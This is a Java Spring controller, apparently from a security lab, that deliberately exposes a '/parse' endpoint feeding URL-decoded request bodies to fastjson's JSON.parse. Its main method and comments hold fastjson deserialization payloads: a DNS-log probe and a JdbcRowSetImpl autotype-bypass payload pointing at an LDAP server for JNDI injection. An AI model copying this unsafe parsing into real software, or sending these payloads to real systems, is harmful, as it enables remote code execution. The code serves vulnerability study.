package summersec.echo.Controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import java.net.URLDecoder;

/**
 * @ClassName: Fastjson
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/6/22 16:24
 * @Version: v1.0.0
 * @Description:
 **/
@Controller
public class Fastjson {
    @RequestMapping(value = "fastjson")
    public String fastjsonvul(){
        return "fastjson";
    }

    @RequestMapping(value = "parse",method = RequestMethod.POST)
    @ResponseBody
    public String vuldemo(@RequestBody String  request){
        System.out.println(request);
        String result = request.substring(9,request.length());
        System.out.println(URLDecoder.decode(result));
        JSON.parse(URLDecoder.decode(result));
        return "parse is ok!";
    }

    public static void main(String[] args) {
        String json = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"wgddy2.dnslog.cn\"}";
        String json1 = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"ldap://127.0.0.1:1389/Cat\",\n" +
                "        \"autoCommit\":\"true\"\n" +
                "    }\n" +
                "}";
        String json2 = "{\n" +
                "  \"array\": [\n" +
                "    1,\n" +
                "    2,\n" +
                "    3\n" +
                "  ],\n" +
                "  \"type\": true,\n" +
                "  \"null\": null,\n" +
                "  \"number\": 123,\n" +
                "  \"object\": {\n" +
                "    \"a\": \"b\",\n" +
                "    \"c\": \"d\"\n" +
                "  },\n" +
                "  \"string\": \"welcome to json\"\n" +
                "}";
        Object ob = JSON.parse(json2);
        System.out.println(ob.getClass().getName());
    }

//    {"@type":"java.net.Inet4Address","val":"cr8s2f.dnslog.cn"}
//{
//    "a":{
//    "@type":"java.lang.Class",
//            "val":"com.sun.rowset.JdbcRowSetImpl"
//},
//    "b":{
//    "@type":"com.sun.rowset.JdbcRowSetImpl",
//            "dataSourceName":"ldap://127.0.0.1:6666/Test",
//            "autoCommit":"true"
//}
//}

}
